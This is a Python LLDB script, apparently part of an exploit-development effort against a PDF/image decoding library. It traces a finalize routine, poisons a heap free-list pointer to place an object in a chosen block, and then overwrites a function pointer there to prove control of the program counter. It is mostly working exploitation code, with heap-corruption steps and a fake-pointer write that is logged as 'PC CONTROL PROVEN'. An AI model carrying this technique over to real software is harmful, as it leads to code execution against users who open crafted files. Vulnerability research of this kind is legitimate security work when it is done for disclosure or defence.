# RIP-21: endgame recon + composed PC-control demo.
# P1: bp data_release_info -> dump finalize object (x0), find x8-source offset,
#     provenance vs pool (x19 region). P2: poison-place block (variant A stop5 /
#     variant B stop2) -> at finalize bp check x0 in chosen block -> if yes,
#     write fake fn-ptr at x8-source offset -> continue -> pc lands on OUR value
#     = PC CONTROL PROVEN.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip21_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()
FAKEPTR = 0x515100000000

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)

def launch_with(bps_names):
    fresh()
    bps = []
    for nm in bps_names:
        b = t.BreakpointCreateByName(nm)
        bps.append(b)
    p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
    return p, bps

T0 = time.time()
def RUNLEFT(): return time.time() - T0 < 1500  # 25-min global cap

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.1); st = p.GetState()
    return st

def stop5_with(p, bpw):
    # p launched with aa_cache_render bp; add walk bp at entry+1804, run to 5th hit
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    b = t.BreakpointCreateByAddress(pc + 1804)
    x19 = x27 = 0
    for i in range(5):
        st = wait_stop(p)
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        x19 = fr.FindRegister("x19").GetValueAsUnsigned()
        x27 = fr.FindRegister("x27").GetValueAsUnsigned()
        if x19: break
    return x19, x27, b

def killall(p, bps):
    for b in bps:
        if b: t.BreakpointDelete(b.GetID())
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

# ---- PHASE-1: consumer trace ----
p, bps = launch_with(["aa_cache_render"])
if not p:
    T("P1 launchfail"); TRACE.close(); sys.exit(0)
x19, x27, bpw = stop5_with(p, bps[0])
T("P1 stop5 x19=%x x27=%x" % (x19, x27))
# continue to decode end; data_release_info bp was NOT set yet — set it now
bp_fin = t.BreakpointCreateByName("data_release_info")
T("P1 data_release_info bp locs=%d" % bp_fin.GetNumLocations())
t.BreakpointDelete(bpw.GetID())
t.BreakpointDelete(bps[0].GetID())  # entry bp must go — it refires per level
hit = False
nhits = 0
for i in range(30):
    st = wait_stop(p)
    if st != lldb.eStateStopped:
        T("P1 decode ended (st=%s rc=%s)" % (st, p.GetExitStatus() if p.IsValid() else -1)); break
    fr = p.GetSelectedThread().GetSelectedFrame()
    nm = fr.GetSymbol().GetName() if fr.GetSymbol() else "?"
    if "data_release_info" in (nm or ""):
        nhits += 1
        x0 = fr.FindRegister("x0").GetValueAsUnsigned()
        x8 = fr.FindRegister("x8").GetValueAsUnsigned() if fr.FindRegister("x8") else 0
        T("P1 FINALIZE#%d x0=%x x8=%x (x19=%x x27=%x) prov: x0-x19=%x x0-x27=%x" % (nhits, x0, x8, x19, x27, x0-x19, x0-x27))
        obj = qwords(p, x0, 0x130//8)
        T("P1 obj dump: %s" % [hex(q) for q in (obj or [])])
        if nhits == 1:
            obj = qwords(p, x0, 0x130//8)
            T("P1 obj dump: %s" % [hex(q) for q in (obj or [])])
            if obj:
                src = [j*8 for j, q in enumerate(obj) if q == x8]
                T("P1 x8-source offsets in obj: %s" % src)
        hit = True
        p.Continue()  # resume past this hit to catch more
    else:
        T("P1 stray stop @%s" % nm[:60])
if not hit: T("P1 finalize NEVER HIT in normal decode")
killall(p, [bp_fin])

# ---- PHASE-2: poison-place + fake fn-ptr -> PC control ----
def phase2(stopnum, tag):
    p, bps = launch_with(["aa_cache_render"])
    if not p: T("%s launchfail" % tag); return
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bwalk = t.BreakpointCreateByAddress(pc + 1804)
    x19 = x27 = 0
    for i in range(stopnum + 1):
        st = wait_stop(p)
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        x19 = fr.FindRegister("x19").GetValueAsUnsigned()
        x27 = fr.FindRegister("x27").GetValueAsUnsigned()
    if not x19:
        T("%s nox19" % tag); killall(p, [bwalk]); return
    qs = qwords(p, x19, 16)
    orig_next = qs[7]
    blk = (x27 - 0x4800) + 0x100
    if 0x100000000 <= orig_next < 0x800000000000:
        hdr = p.ReadMemory(orig_next, 0x100, err)
        if err.Success() and hdr: wr(p, blk, hdr)
    wr(p, x19 + 0x38, struct.pack('<Q', blk))
    T("%s poison x19+0x38 (=%x) -> blk=%x stop=%d" % (tag, orig_next, blk, stopnum))
    t.BreakpointDelete(bwalk.GetID())
    t.BreakpointDelete(bps[0].GetID())  # entry bp refire noise out
    bp_fin = t.BreakpointCreateByName("data_release_info")
    for i in range(200):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            T("%s exited rc=%s before finalize" % (tag, p.GetExitStatus()))
            killall(p, [bp_fin]); return
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = fr.GetSymbol().GetName() if fr.GetSymbol() else "?"
        if "data_release_info" in (nm or ""):
            x0 = fr.FindRegister("x0").GetValueAsUnsigned()
            T("%s FINALIZE x0=%x blk=%x in-blk=%s" % (tag, x0, blk, blk <= x0 < blk + 0x1000))
            if blk <= x0 < blk + 0x1000:
                # object landed in our chosen block! find x8 source offset
                x8 = fr.FindRegister("x8").GetValueAsUnsigned()
                obj = qwords(p, x0, 0x130//8) or []
                src = [j*8 for j, q in enumerate(obj) if q == x8]
                T("%s x8=%x src-offsets=%s" % (tag, x8, src))
                if src:
                    wr(p, x0 + src[0], struct.pack('<Q', FAKEPTR))
                    T("%s fake fn-ptr @x0+%x = %x" % (tag, src[0], FAKEPTR))
                    st = wait_stop(p)
                    if st == lldb.eStateStopped:
                        fr2 = p.GetSelectedThread().GetSelectedFrame()
                        pc2 = fr2.GetPCAddress().GetLoadAddress(t)
                        desc = p.GetSelectedThread().GetStopDescription(300) or ""
                        if (pc2 >> 20) == (FAKEPTR >> 20):
                            T("%s 🎯 PC=%x = FAKEPTR — PC CONTROL PROVEN (%s)" % (tag, pc2, desc[:80]))
                        else:
                            T("%s stop pc=%x %s" % (tag, pc2, desc[:80]))
                    else:
                        T("%s exited rc=%s after ptr write" % (tag, p.GetExitStatus()))
                else:
                    T("%s x8 not found in obj (init may differ)" % tag)
            killall(p, [bp_fin]); return
        # other stop (walk leftovers) — keep going
    T("%s finalize never hit in 200 stops" % tag)
    killall(p, [bp_fin])

phase2(5, "P2A")
phase2(2, "P2B")
T("RIP-21 DONE")
TRACE.close()
